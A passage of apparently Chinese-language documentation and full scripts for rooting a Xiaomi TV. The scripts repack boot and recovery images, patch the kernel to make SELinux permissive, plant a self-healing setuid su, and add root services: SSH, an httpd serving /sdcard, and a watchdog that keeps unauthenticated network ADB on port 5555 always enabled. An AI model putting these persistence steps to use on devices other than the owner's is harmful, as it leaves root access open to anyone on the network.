          [0, mode, uid, gid, 1, 0, len(data), 0, 0, 0, 0, len(nb), 0]).encode()
    out_cpio = pad4(out_cpio + hdr + nb)
    out_cpio = pad4(out_cpio + data)
hdr = b'070701' + ''.join('%08X' % v for v in [0,0,0,0,1,0,0,0,0,0,0,11,0]).encode()
out_cpio = pad4(out_cpio + hdr + b'TRAILER!!!\x00')
out_cpio += b'\x00' * ((len(out_cpio) + 511) // 512 * 512 - len(out_cpio))
print('新 cpio: %d 字节' % len(out_cpio))

# ---- 5. 重打包 boot 镜像（严格页对齐）----
new_rd = gzip.compress(out_cpio, 6)
rd_pad = (ps - len(new_rd) % ps) % ps
header = bytearray(img[:2048])
header[16:20] = struct.pack('<I', len(new_rd))
h = hashlib.sha1()
h.update(kernel); h.update(new_rd); h.update(second)
header[40:48] = h.digest()[:8]

out = bytes(header) + kernel + b'\x00' * (k_pages*ps - ks) + new_rd + b'\x00'*rd_pad + second
print('输出 twrp_patched.img: %d 字节 (原 %d)' % (len(out), len(img)))
if len(out) > 16 * 1024 * 1024:
    sys.exit('超出 recovery 分区 16MB!')
open('twrp_patched.img', 'wb').write(out)

# ---- 6. 自检：重新解包验证补丁已写入 ----
d2 = open('twrp_patched.img', 'rb').read()
ds2 = struct.unpack('<I', d2[16:20])[0]
rd2 = d2[rd_off:rd_off + ds2]
if rd2[:2] == b'\x1f\x8b':
    rd2 = gzip.decompress(rd2)
assert b'systemcontrol disabled' in rd2, '自检失败: 补丁未写入 ramdisk'
print('自检通过: systemcontrol_static 已替换为空脚本')
```

**make_fix_zip.py** —— 救援包生成器（完整代码在 `scripts/make_fix_zip.py`）。打一个 TWRP 可刷入的 `fix.zip`（标准 update-binary 结构），刷入后做两件事：把 `systemcontrol.disabled` 改回 `systemcontrol` 原名；把 env 分区重写为 permissive 版。这是系统分区文件被误改导致无法开机时的零打字救援通道：

```bash
python scripts/make_fix_zip.py env_new.bin   # 生成 fix.zip，放进 U 盘备用
```

```python
# -*- coding: utf-8 -*-
"""
make_fix_zip.py [env_new.bin]

生成 TWRP 可刷入的救援包 fix.zip。刷入后做两件事：
  1. 恢复 /system/bin/systemcontrol（从 systemcontrol.disabled 改回原名）
  2. 把 env 分区重写为 permissive 版（env_new.bin 从 zip 解到 /tmp 后 dd 写入）

用途：系统分区关键文件被误改导致卡开机 logo 时，进 TWRP -> Install -> fix.zip，
全程零打字；也适用于 env 被改回 enforcing 后的重新固化。
"""
import zipfile, sys, os

env_path = sys.argv[1] if len(sys.argv) > 1 else 'env_new.bin'
env = open(env_path, 'rb').read()
assert env[:8] != b'ANDROID!', '传入的是 boot 镜像，不是 env 分区镜像'

UB = b'''#!/sbin/sh
# fix: restore systemcontrol + env permissive
OUT=/proc/self/fd/$2
ui() {
  echo "ui_print $1" > $OUT 2>/dev/null
  echo "ui_print" > $OUT 2>/dev/null
}
ui "=== fix: restore systemcontrol ==="
mkdir -p /system 2>/dev/null
mount /system 2>/dev/null
mount -o rw,remount /system 2>/dev/null
[ -d /system/bin ] || mount -t ext4 -o rw /dev/block/system /system 2>/dev/null
if [ -f /system/bin/systemcontrol.disabled ]; then
  mv /system/bin/systemcontrol.disabled /system/bin/systemcontrol
  chmod 755 /system/bin/systemcontrol
  sync
  ui "FIXED_OK systemcontrol restored"
elif [ -f /system/bin/systemcontrol ]; then
  ui "ALREADY_OK systemcontrol present"
else
  ui "WARN systemcontrol not found"
fi
if [ -f /tmp/env_new.bin ]; then
  ui "writing env (permissive)"
  dd if=/tmp/env_new.bin of=/dev/block/env bs=4096 count=17 2>/dev/null
  sync
  ui "env done"
fi
ui "=== Now Reboot > System ==="
exit 0
'''

z = zipfile.ZipFile('fix.zip', 'w', zipfile.ZIP_DEFLATED)
zi = zipfile.ZipInfo('META-INF/com/google/android/update-binary', (2026, 1, 1, 0, 0, 0))
zi.external_attr = 0o755 << 16        # 可执行权限位，TWRP 按此权限解压
zi.compress_type = zipfile.ZIP_DEFLATED
z.writestr(zi, UB)
z.writestr('env_new.bin', env)
z.close()
print('fix.zip: %d 字节 (env_new.bin %d 字节)' % (os.path.getsize('fix.zip'), len(env)))
```

### build_full_boot.py（完全体镜像装配，宿主机运行）

这是整套持久化的最后一块拼图：把官方 boot.img 拆开，内核打四个补丁，迷你系统注入服务与脚本，
再按原格式装回去。完整源码如下：

```python
# -*- coding: utf-8 -*-
"""
build_full_boot.py —— 构建完全体 boot.img（xmen 小米电视专用，瘦身版）

结构 = 官方 boot.img + 内核四补丁(P1~P4) + 迷你系统八件套（纯文本，无二进制）
设计要点：
  - 迷你系统(ramdisk)有硬体积上限：gz 约 2.4MB 内安全，超出即引导死循环（实测）
  - 因此所有二进制(su/dropbear/sftp/busybox/httpd)放 /data 持久分区，
    由 /heal 脚本在开机时引用，迷你系统只携带脚本与密钥（约 8KB）
三重自检：① 内核补丁回读 ② 迷你系统逐条目核对 ③ 体积安全区校验
"""
import struct, gzip, hashlib, os

PC   = os.path.dirname(os.path.abspath(__file__))            # 仓库 scripts/ 目录
CH   = os.environ.get('XM_CH', os.path.expanduser('~/xiaomitv-fw'))  # 固件工作目录（含 fw/ 子目录）
DESK = os.path.abspath(os.path.join(PC, '..'))

SRC_CPIO   = CH + '/fw/boot_exp/ramdisk3396.cpio'            # 官方 boot 的迷你系统
KERN_PATCH = CH + '/fw/boot_exp/kernel_patched.gz'           # 四补丁内核（A 版实测可引导）
HOSTKEY    = CH + '/dropbear-bin/hostkey_native'             # dropbear 原生格式主机钥匙
NEW2       = PC + '/install-recovery.sh.new2'                # ADB 常驻巡查版（接管 install-recovery）
STOCK_BOOT = DESK + '/backup/boot.img'                       # 官方 boot 分区 20MB 全镜像
OUT_IMG    = DESK + '/boot_full.img'

def parse_cpio(d):
    off, entries = 0, []
    while off < len(d):
        if d[off:off+6] != b'070701':
            t = d.find(b'070701', off)
            if t == -1: break
            off = t; continue
        f = [int(d[off+6+i*8:off+14+i*8], 16) for i in range(13)]
        namesize, filesize, mode = f[11], f[6], f[1]
        name = d[off+110:off+110+namesize-1].decode('latin1')
        data_off = (off + 110 + namesize + 3) & ~3
        if name == 'TRAILER!!!': break
        entries.append([name, mode, d[data_off:data_off+filesize]])
        off = data_off + filesize
        off = (off + 3) & ~3
    return entries

def pad4(b): return b + b'\x00' * ((4 - len(b) % 4) % 4)

def build_cpio(entries):
    out = b''
    for name, mode, data in entries:
        nb = name.encode('latin1') + b'\x00'
        hdr = b'070701' + ''.join('%08X' % v for v in
              [0, mode, 0, 0, 1, 0, len(data), 0, 0, 0, 0, len(nb), 0]).encode()
        out = pad4(out + hdr + nb)
        out = pad4(out + data)
    hdr = b'070701' + ''.join('%08X' % v for v in [0,0,0,0,1,0,0,0,0,0,0,11,0]).encode()
    out = pad4(out + hdr + b'TRAILER!!!\x00')
    out += b'\x00' * ((len(out) + 511) // 512 * 512 - len(out))
    return out

print('===== 1. 生成 /heal 脚本 =====')

HEAL_SH = '''#!/system/bin/sh
# xmen self-heal (init service, root with full caps)
H=/heal
L=/data/local/tmp/heal.log
{
echo "=== heal $(date) ==="
id

# A. su self-heal (binary from /data, reinstalled into /system if missing)
if [ ! -x /system/xbin/su ]; then
    if [ -f /data/local/tmp/su ]; then
        mount -o rw,remount /system
        cp /data/local/tmp/su /system/xbin/su
        chown 0:0 /system/xbin/su
        chmod 6755 /system/xbin/su
        echo "su reinstalled"
    fi
fi

# B. build.prop self-check
mount -o rw,remount /system
grep -q "^ro.adb.secure=0" /system/build.prop || echo "ro.adb.secure=0" >> /system/build.prop
grep -q "^ro.debuggable=1" /system/build.prop || echo "ro.debuggable=1" >> /system/build.prop

# B2. /etc/shells for dropbear shell validation (after /system rw)
mkdir -p /etc
echo /system/bin/sh > /etc/shells

# C. install-recovery hook self-check
if ! grep -q "adbwatch" /system/bin/install-recovery.sh 2>/dev/null; then
    if [ -f /data/local/tmp/install-recovery.sh.new2 ]; then
        cp /data/local/tmp/install-recovery.sh.new2 /system/bin/install-recovery.sh
        chown 0:0 /system/bin/install-recovery.sh
        chmod 750 /system/bin/install-recovery.sh
    fi
fi

# D. ssh env: root home dir (strict perms for dropbear) + passwd + profile
mkdir -p /data/local/tmp/sshhome/.ssh
cp $H/authorized_keys /data/local/tmp/sshhome/.ssh/authorized_keys
chown 0:0 /data/local/tmp/sshhome /data/local/tmp/sshhome/.ssh /data/local/tmp/sshhome/.ssh/authorized_keys
chmod 700 /data/local/tmp/sshhome /data/local/tmp/sshhome/.ssh
chmod 600 /data/local/tmp/sshhome/.ssh/authorized_keys
echo 'root:*:0:0:root:/data/local/tmp/sshhome:/system/bin/sh' > /system/etc/passwd
chown 0:0 /system/etc/passwd
chmod 600 /system/etc/passwd
cp $H/profile /data/local/tmp/sshhome/.profile 2>/dev/null

# E. sftp at dropbear's compiled-in path
mkdir -p /data/adb/sshserver
cp /data/local/tmp/sftp /data/adb/sshserver/sftp
chmod 755 /data/adb/sshserver/sftp

# F. convenience scripts
printf '#!/system/bin/sh\\nmount -o rw,remount /system && echo system-rw\\n' > /data/local/tmp/sysrw
printf '#!/system/bin/sh\\nmount -o ro,remount /system && echo system-ro\\n' > /data/local/tmp/sysro
chmod 755 /data/local/tmp/sysrw /data/local/tmp/sysro

# G. OTA off + ADB props + adbd restart
setprop persist.sys.ota.update 0
setprop ctl.stop bdupdate
setprop service.adb.tcp.port 5555
setprop persist.adb.tcp.port 5555
# adbd 协议状态偶发卡死（5555 已监听但握手失败），开机末期无条件重启一次
setprop ctl.restart adbd

sync
echo "=== heal done ==="
} > $L 2>&1
'''

ADBWATCH_SH = '''#!/system/bin/sh
# ADB 常驻巡查：每 20 秒检查，被关 20 秒内自动拉回
i=0
while true; do
    sleep 20
    ACT=""
    EN=$(settings get global adb_enabled 2>/dev/null)
    if [ "$EN" != "1" ]; then
        settings put global adb_enabled 1
        ACT="$ACT adb_enabled"
    fi
    P=$(getprop service.adb.tcp.port 2>/dev/null)
    if [ "$P" != "5555" ]; then
        setprop persist.adb.tcp.port 5555
        setprop service.adb.tcp.port 5555
        ACT="$ACT tcpport"
    fi
    DIS=$(getprop sys.set_adb_disabled 2>/dev/null)
    if [ "$DIS" != "false" ]; then
        setprop sys.set_adb_disabled false
        ACT="$ACT disabled_flag"
    fi
    L=$(netstat -tln 2>/dev/null | grep -c ":5555")
    if [ "$L" = "0" ]; then
        setprop ctl.restart adbd
        ACT="$ACT adbd_restart"
    fi
    i=$((i+1))
    if [ -n "$ACT" ]; then
        echo "$(date) tick$i fixed:$ACT" >> /data/local/tmp/adbwatch.log
    fi
done
'''

PASSWD  = 'root:*:0:0:root:/data/local/tmp/sshhome:/system/bin/sh\n'
PROFILE = ('export PATH=/system/bin:/system/xbin:/data/local/tmp:$PATH\n'
           'export HOME=/data/local/tmp/sshhome\n'
           'export TERM=xterm-256color\n'
           "alias ll='ls -la'\n"
           'cd /data/local/tmp\n')

hostkey = open(HOSTKEY, 'rb').read()
pubkey  = open(DESK + '/ssh/tv_client_ed25519.pub', 'rb').read().strip()
new2    = open(NEW2, 'rb').read().replace(b'\r\n', b'\n')

heal_files = {
    'heal/heal.sh':                  (0o100755, HEAL_SH.encode('utf-8')),
    'heal/adbwatch.sh':              (0o100755, ADBWATCH_SH.encode('utf-8')),
    'heal/install-recovery.sh.heal': (0o100644, new2),
    'heal/hostkey':                  (0o100600, hostkey),
    'heal/authorized_keys':          (0o100644, pubkey + b'\n'),
    'heal/passwd':                   (0o100644, PASSWD.encode('utf-8')),
    'heal/profile':                  (0o100644, PROFILE.encode('utf-8')),
}
for n in heal_files: print('  ✓', n)

print('===== 2. 组装 ramdisk =====')
rd = open(SRC_CPIO, 'rb').read()
orig = parse_cpio(rd)
new_entries = []
for name, mode, data in orig:
    if name == 'default.prop':
        data = (data.decode('latin1').rstrip('\n') +
                '\nro.adb.secure=0\nro.debuggable=1\nservice.adb.tcp.port=5555\n').encode('latin1')
        print('  default.prop -> %d 字节 (+3 属性)' % len(data))
    elif name == 'init.rc':
        irc = data.decode('latin1').rstrip('\n') + '''
# === xmen full-control services ===
service heal /system/bin/sh /heal/heal.sh
    class main
    user root
    group root
    oneshot

service adbwatch /system/bin/sh /heal/adbwatch.sh
    class main
    user root
    group root

service dropbear /data/local/tmp/dropbear -r /heal/hostkey -p 22
    class main
    user root
    group root

service httpd /data/local/tmp/httpd 8080 /sdcard
    class main
    user root
    group root
'''
        data = irc.encode('latin1')
        print('  init.rc -> %d 字节 (+4 服务)' % len(data))
    new_entries.append((name, mode, data))
new_entries.append(('heal/', 0o40755, b''))
for name, (mode, data) in heal_files.items():
    new_entries.append((name, mode, data))

new_cpio = build_cpio(new_entries)
new_rd_gz = gzip.compress(new_cpio, 6)
print('cpio: %d 字节 (原 %d, +%d) | gzip: %d 字节' %
      (len(new_cpio), len(rd), len(new_cpio)-len(rd), len(new_rd_gz)))
assert len(new_rd_gz) < 2500000, 'ramdisk gz 超过 2.4MB 安全线!'

print('===== 3. 组装 boot_full.img =====')
d = open(STOCK_BOOT, 'rb').read()
kern = open(KERN_PATCH, 'rb').read()   # 已压缩的补丁内核（A 版实测可引导）
ps = struct.unpack('<I', d[36:40])[0]
kso = struct.unpack('<I', d[8:12])[0]
rs_old = struct.unpack('<I', d[16:20])[0]
ss = struct.unpack('<I', d[32:36])[0]
kp_old = (kso+ps-1)//ps
sec_off = 2048 + kp_old*ps + (rs_old+ps-1)//ps*ps
sec = d[sec_off:sec_off+ss]

kp = (len(kern)+ps-1)//ps
header = bytearray(d[:2048])
struct.pack_into('<I', header, 8, len(kern))
struct.pack_into('<I', header, 16, len(new_rd_gz))
h = hashlib.sha1(); h.update(kern); h.update(new_rd_gz); h.update(sec)
header[40:48] = h.digest()[:8]
img = bytes(header) + kern + b'\x00'*(kp*ps-len(kern)) \
    + new_rd_gz + b'\x00'*((ps-len(new_rd_gz)%ps)%ps) + sec
open(OUT_IMG, 'wb').write(img)
print('boot_full.img: %d 字节 (分区 20MB)' % len(img))
assert len(img) <= 20*1024*1024

print('===== 4. 三重自检 =====')
v = open(OUT_IMG, 'rb').read()
assert v[:8] == b'ANDROID!'
ks2 = struct.unpack('<I', v[8:12])[0]; rs2 = struct.unpack('<I', v[16:20])[0]
kp2 = (ks2+ps-1)//ps
k2 = gzip.decompress(v[2048:2048+ks2])
r2 = gzip.decompress(v[2048+kp2*ps : 2048+kp2*ps+rs2])
assert k2[0xe4525d:0xe4525d+11] == b'enforcinG=\x00', 'P1 失败'
assert k2[0x30909c:0x30909c+8] == bytes.fromhex('e00302aac0035fd6'), 'P2 失败'
assert k2.count(b'XMENOK01') == 2, 'P3/P4 失败'
assert k2[0x38:0x3c] == b'ARMd', 'Image magic 失败'
print('① 内核四补丁回读: P1✓ P2✓ XMENOK01 x2 ✓ ARMd✓')

e2 = dict((e[0], e[2]) for e in parse_cpio(r2))
assert b'ro.adb.secure=0' in e2['default.prop'] and b'ro.debuggable=1' in e2['default.prop']
assert b'service dropbear /data/local/tmp/dropbear -r /heal/hostkey -p 22' in e2['init.rc']
assert b'service httpd /data/local/tmp/httpd 8080 /sdcard' in e2['init.rc']
for n, (mode, data) in heal_files.items():
    assert n in e2 and e2[n] == data, '内容不符: ' + n
assert b'sshhome' in e2['heal/heal.sh'] and b'/etc/shells' in e2['heal/heal.sh']
for name, mode, data in orig:
    if name in ('default.prop', 'init.rc'): continue
    assert name in e2 and e2[name] == data, '原文件被改: ' + name
assert all(('heal/'+b) not in e2 for b in ('su', 'busybox', 'dropbear', 'sftp'))
print('② 迷你系统: 属性✓ 4服务✓ /heal 7项逐字节一致✓ 原文件未动✓ 无二进制✓')
print('③ 体积安全区: ramdisk gz %d 字节 < 2.4MB 上限 ✓' % rs2)
print('===== 构建完成: %s =====' % OUT_IMG)
```

### build_logo.py（开机 Logo 打包，宿主机运行）

把任意方形图标打包成 Amlogic `AML_RES! V2` 格式的 logo 镜像。格式逆向自 U-Boot `cmd_imgread.c`：64 字节镜像头 + N×64 字节条目头 + gzip 压缩的 24bpp BMP。U-Boot 只校验镜像头（magic/version）与每个条目的 magic（`0x27051956`），CRC 字段不参与校验。

**关键细节：条目顺序不能照原厂排。** U-Boot 收到 `bootup` 请求时先按 `outputmode` 改名成 `bootup_720`/`bootup_1080`，查找规则是「纠正后的名字 **或** 原始请求名」任一命中即用——原厂把 `bootup` 排在 `bootup_1080` 前面，1080p 电视实际命中的是 720p 那张图。本脚本把精确名排在最前，任何请求链都先命中高分图。

原厂实测规格（本机型）：1080p 图 1920×1080 图标 142px 居中；720p 图 1280×720 图标 96px 居中。图标默认照此缩放，与原厂观感一致。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 依赖: pip install pillow numpy
# 用法: python build_logo.py --src icon.png --out logo.img [--icon-1080 142 --icon-720 96]
import argparse, gzip, struct, sys
from PIL import Image
import numpy as np

IH_MAGIC = 0x27051956
RES_MAGIC = b"AML_RES!"
DATA_ALIGN = 0x800  # 条目数据 2K 对齐（mtd nand 页），emmc 512 也兼容

# 顺序关键：U-Boot 匹配规则是「picName==name || 原始请求名==name」，
# 遍历按表序，原始名 fallback 会提前命中，因此精确名必须排在 bootup 之前。
ITEMS = [
    ("bootup_1080", "1080"), ("bootup_720", "720"), ("bootup", "720"),
    ("bootup_1920", "1080"), ("redmi_1920", "1080"), ("redmi", "720"),
]

def encode_bmp24(canvas):
    """RGB 图 → 24bpp BMP 字节（自底向上、BGR、行 4 字节对齐）。"""
    w, h = canvas.size
    a = np.asarray(canvas, dtype=np.uint8)
    row_sz = (w * 3 + 3) // 4 * 4
    pad = row_sz - w * 3
    rows = [a[y, :, ::-1].tobytes() for y in range(h)]   # BGR
    data = b"".join(rows[y] + (b"\x00" * pad if pad else b"")
                    for y in range(h - 1, -1, -1))        # 自底向上
    fsz = 54 + row_sz * h
    hdr = struct.pack("<2sIHHIIIiHHIIiiII", b"BM", fsz, 0, 0, 54,
                      40, w, h, 1, 24, 0, row_sz * h, 2835, 2835, 0, 0)
    return hdr + data

def make_bmp(cw, ch, icon, size):
    icon = icon.convert("RGBA")
    if icon.width != size or icon.height != size:
        icon = icon.resize((size, size), Image.LANCZOS)
    canvas = Image.new("RGB", (cw, ch), (0, 0, 0))
    canvas.paste(icon, ((cw - size) // 2, (ch - size) // 2), icon)
    return encode_bmp24(canvas)

def pack_res_img(bmp720, bmp1080):
    gz = {"720": gzip.compress(bmp720, 9, mtime=0),
          "1080": gzip.compress(bmp1080, 9, mtime=0)}
    data_off = (64 + len(ITEMS) * 64 + DATA_ALIGN - 1) // DATA_ALIGN * DATA_ALIGN
    blob = bytearray(b"\x00" * data_off)
    cur, infos = data_off, []
    for name, res in ITEMS:
        d = gz[res]
        blob += b"\x00" * (cur - len(blob))
        blob += d
        infos.append((name, res, len(d), cur))
        cur = (cur + len(d) + DATA_ALIGN - 1) // DATA_ALIGN * DATA_ALIGN
    head = struct.pack("<Ii8sIII", 0, 2, RES_MAGIC, len(blob), len(ITEMS), 16)
    blob[0:64] = head + b"\x00" * (64 - len(head))
    n = len(infos)
    for i, (name, res, size, start) in enumerate(infos):
        e = struct.pack("<IIIIIIIBBBB", IH_MAGIC, 0, size, start, 0,
                        (64 + (i + 1) * 64) if i < n - 1 else 0, 0, i, n, 0, 0)
        nm = name.encode()
        blob[64 + i * 64: 64 + (i + 1) * 64] = e + nm + b"\x00" * (32 - len(nm))
    return bytes(blob), infos

def verify(b):
    ok = True
    img_sz, num = struct.unpack("<II", b[16:24])
    assert b[8:16] == RES_MAGIC and struct.unpack("<I", b[4:8])[0] == 2
    assert img_sz == len(b)
    for i in range(num):
        e = b[64 + i * 64: 64 + (i + 1) * 64]
        m, _, size, start = struct.unpack("<IIII", e[0:16])
        name = e[32:64].split(b"\x00")[0].decode()
        assert m == IH_MAGIC, name
        bmp = gzip.decompress(b[start:start + size])
        w, h = struct.unpack("<ii", bmp[18:26])
        cx, cy, row = w // 2, h // 2, ((w * 3 + 3) // 4) * 4
        off = 54 + (h - 1 - cy) * row + cx * 3
        bright = sum(bmp[off:off + 3])
        if bright <= 60: ok = False
        print(f"  {name:12s} {w}x{h} 中心亮度={bright}")
    return ok

ap = argparse.ArgumentParser()
ap.add_argument("--src", required=True)
ap.add_argument("--out", required=True)
ap.add_argument("--icon-1080", type=int, default=142)
ap.add_argument("--icon-720", type=int, default=96)
a = ap.parse_args()
icon = Image.open(a.src)
blob, _ = pack_res_img(make_bmp(1280, 720, icon, a.icon_720),
                       make_bmp(1920, 1080, icon, a.icon_1080))
open(a.out, "wb").write(blob)
print(f"打包完成: {a.out} ({len(blob)} 字节)")
sys.exit(0 if verify(open(a.out, "rb").read()) else 1)
```

构建后先用 Pillow 打开生成的 BMP 做一次视觉确认（正立、居中、无失真），再推设备：

```sh
python build_logo.py --src areyouok.png --out logo_areyouok.img
```

### flash_logo.sh（电视端替换，Root 门卫）

在电视上执行。**设计为未拿到 Root 时什么都不碰**：脚本第一步探测 root，无 root 直接退出；确认 root 后自动备份当前 logo 分区再写入，写完回读逐字节校验，不一致自动回滚。

```sh
#!/system/bin/sh
# flash_logo.sh — 小米电视4 开机 Logo 替换（电视端执行）
# 用法: sh /data/local/tmp/flash_logo.sh /data/local/tmp/logo_areyouok.img
# 退出码: 0 成功 / 1 未 Root 或参数缺失 / 2 备份或写入失败

LOGO_DEV="/dev/block/logo"
IMG="$1"
STAMP=$(date +%Y%m%d_%H%M%S)
BACKUP="/data/local/tmp/logo_backup_${STAMP}.img"

echo "=== 小米电视4 开机 Logo 替换 ==="

# ---- Root 门卫: 不是 root 什么都不碰 ----
if [ "$(id -u)" != "0" ]; then
    if command -v su >/dev/null 2>&1 && su -c 'id -u' 2>/dev/null | grep -q '^0$'; then
        echo "[i] 通过 su 获得 root"
        exec su -c "sh $0 $IMG"
    fi
    echo "[!] 未检测到 Root 权限，按设计跳过 Logo 替换。"
    echo "    先完成提权步骤（见操作步骤第 3 节），再来执行本脚本。"
    exit 1
fi
echo "[✓] Root 权限确认，允许替换"

# ---- 参数与目标检查 ----
if [ -z "$IMG" ] || [ ! -f "$IMG" ]; then
    echo "[!] 用法: sh $0 <logo镜像路径>"
    exit 1
fi
if [ ! -e "$LOGO_DEV" ]; then
    echo "[!] 找不到 logo 分区 $LOGO_DEV，本机型不适用"
    exit 2
fi

# ---- 镜像头快速自检 ----
magic=$(dd if="$IMG" bs=1 skip=8 count=8 2>/dev/null)
if [ "$magic" != "AML_RES!" ]; then
    echo "[!] $IMG 头部不是 AML_RES!，拒绝写入"
    exit 2
fi

# ---- 备份当前 logo ----
echo "[i] 备份当前 logo → $BACKUP"
dd if="$LOGO_DEV" of="$BACKUP" bs=4096 count=1024 2>/dev/null || exit 2
bmagic=$(dd if="$BACKUP" bs=1 skip=8 count=8 2>/dev/null)
if [ "$bmagic" != "AML_RES!" ]; then
    echo "[!] 备份内容异常，中止"
    exit 2
fi
echo "[✓] 备份完成 ($(ls -l "$BACKUP" | awk '{print $5}') 字节)"

# ---- 写入（本机 dd 不支持 conv= 参数，dd 默认即覆盖写不动后续扇区）----
sz=$(ls -l "$IMG" | awk '{print $5}')
echo "[i] 写入 $IMG ($sz 字节) → $LOGO_DEV"
dd if="$IMG" of="$LOGO_DEV" bs=4096 2>/dev/null
sync

# ---- 回读校验（截取分区前 sz 字节比对），不一致自动回滚 ----
n=$(( (sz + 4095) / 4096 ))
VERIFY=/data/local/tmp/.logo_verify
dd if="$LOGO_DEV" of="$VERIFY" bs=4096 count=$n 2>/dev/null
head -c "$sz" "$VERIFY" > "${VERIFY}.cut"
if ! cmp -s "$IMG" "${VERIFY}.cut"; then
    echo "[!] 写入后回读不一致！立即用备份回滚..."
    dd if="$BACKUP" of="$LOGO_DEV" bs=4096 2>/dev/null
    sync
    echo "[!] 已回滚到原 logo。请检查传输完整性后重试。"
    exit 2
fi
rm -f "$VERIFY" "${VERIFY}.cut"
echo "[✓] 回读校验一致"
echo "=== 替换成功：本设备已获得最高权限（此 Logo 即 Root 后的标识） ==="
echo "重启电视即可看到新开机画面。"
echo "回滚命令: dd if=$BACKUP of=$LOGO_DEV bs=4096; sync"
exit 0
```

### build_autoscript.py（U-Boot legacy 脚本打包，宿主机运行）

把明文命令文本打包成 U-Boot legacy script 镜像（aml_autoscript），供支持
`autoscr` / `source` 命令的 Amlogic U-Boot 使用。格式依据 U-Boot 源码
`common/cmd_source.c`（消费端校验）与 `common/image.c`（CRC 算法），并与真实
mkimage 产物逐字段对照验证（hcrc / dcrc 复算全部一致）。

镜像结构:

- 64B 头，全大端: magic(0x27051956) / hcrc(整头 CRC，hcrc 字段置 0) / time /
  size / load / ep / dcrc(数据 CRC) / os:arch:type:comp / name[32]
- 数据区: BE32(脚本总长) + BE32(0 终止标记) + 脚本文本——对应 cmd_source.c 的
  `len=*data; while(*data++);` 消费模式
- 校验路径: magic → hcrc → verify（env 未设时默认开）→ dcrc → type==IH_TYPE_SCRIPT

**适用性注意**: 本系列固件（txl_xmen）未编译该命令，产物在本机不生效；收录供
其他保留 autoscr/source 的 Amlogic 固件复用与格式研究。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
build_autoscript.py — U-Boot legacy script 打包器（aml_autoscript 生成）

格式依据本机 U-Boot 源码（权威）:
  common/cmd_source.c source(): 校验 magic → hcrc → (verify=1 时) dcrc → type==IH_TYPE_SCRIPT,
  数据区 = BE32(脚本总长) + BE32(0 终止标记) + 脚本文本, run_command_list 执行。
  common/image.c: hcrc = CRC32(整个 64B 头, hcrc 字段置 0); dcrc = CRC32(数据区);
  CRC32 多项式与 zlib 一致。verify env 未设置时默认开启, dcrc 必须正确。
  store_interface.c: store write <分区名> <内存地址> <偏移> <大小> 为通用分区写命令。

用法:
  python build_autoscript.py --text rescue.script --out aml_autoscript --name rescue
  python build_autoscript.py --demo            # 生成三份标准脚本到 --outdir
"""
import argparse
import struct
import sys
import zlib

IH_MAGIC = 0x27051956
IH_OS_LINUX = 5
IH_ARCH_ARM = 1
IH_TYPE_SCRIPT = 6
IH_COMP_NONE = 0


def build_script_image(text: str, name: bytes = b"usb_rescue") -> bytes:
    """脚本文本 → legacy U-Boot script image 字节。"""
    script = text.encode("ascii")
    # 数据区: BE32(总长) + BE32(0 终止) + 文本   (cmd_source.c: len=*data; while(*data++);)
    data = struct.pack(">II", len(script), 0) + script
    # 头: image_header_t 9 字段全 BE:
    #   magic/hcrc/time/size/load/ep/dcrc/os:arch:type:comp/name[32]
    # time = 构建时间戳（autoscr 不校验, 照 mkimage 惯例填）
    import time as _time
    stamp = int(_time.time()) & 0xFFFFFFFF
    hdr = struct.pack(
        ">IIIIIIII", IH_MAGIC, 0, stamp, len(data), 0, 0, 0, 0
    )
    # offset 0x1c 处 4 字节 = os/arch/type/comp（覆盖占位）
    hdr = hdr[:28] + bytes([IH_OS_LINUX, IH_ARCH_ARM, IH_TYPE_SCRIPT, IH_COMP_NONE])
    hdr += name[:32].ljust(32, b"\x00")
    assert len(hdr) == 64
    # dcrc 先填（数据 CRC），再算 hcrc（覆盖含 dcrc 的整头, hcrc 字段置 0）
    dcrc = zlib.crc32(data) & 0xFFFFFFFF
    hdr = hdr[:24] + struct.pack(">I", dcrc) + hdr[28:]
    hcrc = zlib.crc32(hdr) & 0xFFFFFFFF
    hdr = hdr[:4] + struct.pack(">I", hcrc) + hdr[8:]
    return hdr + data


def verify_image(blob: bytes) -> bool:
    """回读自检: 按 cmd_source.c 的校验路径逐项复算。"""
    ok = True
    magic, hcrc, tstamp, size, load, ep, dcrc = struct.unpack(">IIIIIII", blob[:28])
    os_, arch, typ, comp = blob[28:32]
    name = blob[32:64].rstrip(b"\x00").decode("ascii", "replace")
    data = blob[64:64 + size]

    if magic != IH_MAGIC:
        print("  magic 错"); ok = False
    if size != len(blob) - 64:
        print("  size 字段与实际数据不符"); ok = False
    # hcrc 复算: 整头 64B, hcrc 字段置 0
    hdr0 = blob[:4] + b"\x00\x00\x00\x00" + blob[8:64]
    if zlib.crc32(hdr0) & 0xFFFFFFFF != hcrc:
        print("  hcrc 错"); ok = False
    # dcrc 复算
    if zlib.crc32(data) & 0xFFFFFFFF != dcrc:
        print("  dcrc 错"); ok = False
    if typ != IH_TYPE_SCRIPT:
        print("  type 不是 SCRIPT"); ok = False

    # 数据区解析: [BE32 总长][BE32 0][文本]
    l1, l2 = struct.unpack(">II", data[:8])
    text = data[8:8 + l1]
    if l2 != 0 or len(text) != l1:
        print("  数据区结构错"); ok = False
    print(f"  头: magic=OK hcrc=OK dcrc=OK type=SCRIPT({typ}) os={os_} arch={arch} time={tstamp}")
    print(f"  数据: 脚本 {l1} 字节, name={name!r}")
    print(f"  首行: {text.splitlines()[0][:60]!r}")
    print(f"  行数: {len(text.splitlines())}")
    return ok


SCRIPTS = {
    # 1) 无害验证: 写入一个 env 标记并重启, 回系统后 ADB 读 env 分区即可闭环
    "test.script": """\
echo === USB AUTOSCRIPT TEST ===
setenv usb_rescue_test ok
saveenv
echo test done, rebooting
reset
""",
    # 2) 引导 U 盘里的 TWRP (不写任何分区, 最安全)
    "rescue.script": """\
echo === USB RESCUE: boot TWRP from udisk ===
if fatload usb 0 ${loadaddr} twrp.img; then
  echo twrp loaded, booting...
  bootm ${loadaddr}
else
  echo ERROR: twrp.img not found on usb
fi
""",
    # 3) 把 U 盘里的 TWRP 写入 recovery 分区再引导 (store write 分区名 地址 偏移 大小)
    "install.script": """\
echo === USB INSTALL: write TWRP to recovery partition ===
if fatload usb 0 ${loadaddr} twrp.img; then
  store write recovery ${loadaddr} 0 ${filesize}
  echo recovery partition written, booting twrp...
  bootm ${loadaddr}
else
  echo ERROR: twrp.img not found on usb
fi
""",
    # 4) 极限救援: 同时写 boot 分区 (U 盘里放打补丁的 boot.img) 再引导 TWRP
